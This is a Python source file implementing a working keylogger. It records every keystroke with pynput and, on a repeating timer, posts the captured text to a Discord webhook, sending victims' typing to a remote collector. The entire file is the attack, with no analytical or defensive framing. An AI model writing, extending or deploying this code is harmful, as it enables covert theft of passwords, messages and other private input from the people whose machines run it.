import pynput.keyboard
import threading
import requests


class Keylogger:
    def __init__(self, interval, webhook_url):
        self.log = ""
        self.interval = interval
        self.webhook_url = webhook_url

    def append_to_log(self, string):
        self.log += string

    def on_press(self, key):
        try:
            self.append_to_log(key.char)
        except AttributeError:
            if key == key.space:
                self.append_to_log(" ")
            else:
                self.append_to_log(" [" + str(key) + "] ")

    def report(self):
        if self.log.strip() != "":
            self.send_to_discord(self.log)
            self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.daemon = True
        timer.start()

    def send_to_discord(self, message):
        data = {
            "content": f"```\n{message}\n```"
        }
        try:
            requests.post(self.webhook_url, json=data)
        except Exception as e:
            print(f"Failed to send to Discord: {e}")

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.on_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
